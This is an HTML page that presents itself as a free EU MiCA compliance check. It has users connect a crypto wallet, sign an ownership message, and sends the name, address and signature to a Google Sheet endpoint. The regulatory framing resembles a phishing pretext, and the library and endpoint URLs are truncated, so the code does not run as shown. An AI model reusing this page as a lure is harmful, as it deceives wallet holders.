<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MiCA Multi-Chain USDC Verification</title>
  
  <!-- Load ultra-stable, native Web3 Onboard modules for multi-chain wallet pairing -->
  <script src="https://unpkg.com"></script>
  <script src="https://unpkg.com"></script>
  <script src="https://unpkg.com"></script>
  <script src="https://cloudflare.com"></script>
  
  <style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { background: #ffffff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 30px; max-width: 450px; width: 100%; text-align: center; }
    h2 { color: #1e3a8a; margin-top: 0; }
    p { font-size: 14px; color: #555; line-height: 1.5; }
    .input-group { margin: 15px 0; text-align: left; }
    label { font-weight: 600; font-size: 13px; color: #475569; display: block; margin-bottom: 6px; }
    input[type="text"], select { width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; box-sizing: border-box; font-size: 14px; background: white; }
    .btn { background-color: #2563eb; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-size: 15px; font-weight: bold; width: 100%; transition: background 0.2s; margin-top: 15px; }
    .btn:hover { background-color: #1d4ed8; }
    .btn:disabled { background-color: #cbd5e1; cursor: not-allowed; }
    .status { margin-top: 15px; font-weight: 600; font-size: 14px; padding: 10px; border-radius: 6px; display: none; }
    .success { background-color: #dcfce7; color: #15803d; }
    .error { background-color: #fee2e2; color: #b91c1c; }
  </style>
</head>
<body>

<div class="container">
  <h2>USDC2 Wallet Verification</h2>
  <p>To comply with EU MiCA/TFR rules, please verify your wallet ownership using any mobile crypto wallet. This process is secure and completely free.</p>
  
  <div class="input-group">
    <label for="kolName">Your Name / Channel Name</label>
    <input type="text" id="kolName" placeholder="e.g., CryptoWhale Official">
  </div>

  <div class="input-group">
    <label for="networkType">USDC Payout Network</label>
    <select id="networkType">
      <option value="Ethereum">Ethereum Mainnet</option>
      <option value="Polygon">Polygon POS Network</option>
      <option value="Arbitrum">Arbitrum Layer-2</option>
      <option value="Base">Base Layer-2</option>
    </select>
  </div>

  <button class="btn" id="connectBtn" onclick="startVerification()">Connect & Verify Wallet</button>
  
  <div id="statusBox" class="status"></div>
</div>

<script>
// ==================== CONFIGURATION ====================
// ACTIVE GOOGLE SHEET BACKEND API ENDPOINT URL:
const GOOGLE_SCRIPT_URL = "https://google.com";
// ========================================================

let onboardInstance = null;

function initOnboard() {
  if (onboardInstance) return onboardInstance;

  const injected = window.injectedWallets.default();
  const walletConnect = window.walletConnect.default({
    projectId: 'c4a7e93736780c850787e9eb0ef6e384',
    requiredChains: [1],
    optionalChains: [137, 42161, 8453]
  });

  onboardInstance = window.web3OnboardCore.default({
    wallets: [injected, walletConnect],
    chains: [
      { id: '0x1', token: 'ETH', label: 'Ethereum', rpcUrl: 'https://cloudflare-eth.com' },
      { id: '0x89', token: 'MATIC', label: 'Polygon', rpcUrl: 'https://polygon-rpc.com' },
      { id: '0xa4b1', token: 'ETH', label: 'Arbitrum', rpcUrl: 'https://arbitrum.io' },
      { id: '0x2105', token: 'ETH', label: 'Base', rpcUrl: 'https://base.org' }
    ],
    appMetadata: {
      name: 'MiCA Compliance Dashboard',
      description: 'USDC Payout Verification Portal'
    }
  });

  return onboardInstance;
}

function showStatus(msg, type) {
  const statusBox = document.getElementById('statusBox');
  statusBox.innerText = msg;
  statusBox.className = "status " + type;
  statusBox.style.display = "block";
}

async function startVerification() {
  const kolName = document.getElementById('kolName').value.trim();
  const selectedNetwork = document.getElementById('networkType').value;
  const connectBtn = document.getElementById('connectBtn');

  if (!kolName) {
    showStatus("Please enter your name or channel before verifying.", "error");
    return;
  }
  if (GOOGLE_SCRIPT_URL.includes("YOUR_GOOGLE")) {
    showStatus("Configuration Error: Please update GOOGLE_SCRIPT_URL target.", "error");
    return;
  }

  try {
    connectBtn.disabled = true;
    showStatus("Opening secure wallet selector layout...", "success");

    const onboard = initOnboard();
    const wallets = await onboard.connectWallet();
    
    if (wallets.length === 0) {
      showStatus("Connection canceled by user.", "error");
      connectBtn.disabled = false;
      return;
    }

    const connectedWallet = wallets[0];
    const walletAddress = connectedWallet.accounts[0].address;
    const provider = new ethers.providers.Web3Provider(connectedWallet.provider);
    const signer = provider.getSigner();

    // Create secure compliance message statement
    const msgToSign = `MiCA Compliance Verification\nI confirm that I own and control the wallet address for USDC payouts: ${walletAddress}\nAuthorized by: ${kolName}`;
    
    showStatus("Connected! Please tap 'Sign Message' inside your phone or extension wallet...", "success");
    const signature = await signer.signMessage(msgToSign);

    showStatus("Signature validated. Sending verification to Google Sheet...", "success");

    // Push data packet directly to Google Web App Endpoint
    await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      mode: "no-cors", 
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        kolName: kolName,
        network: selectedNetwork,
        walletAddress: walletAddress,
        signature: signature
      })
    });

    showStatus(`Success! Your ${selectedNetwork} wallet was securely logged under MiCA rules.`, "success");
    connectBtn.innerText = "Verified ✅";
    onboard.disconnectWallet({ label: connectedWallet.label });

  } catch (error) {
    showStatus("Verification failed: " + (error.message || error), "error");
    connectBtn.disabled = false;
  }
}
</script>

</body>
</html>
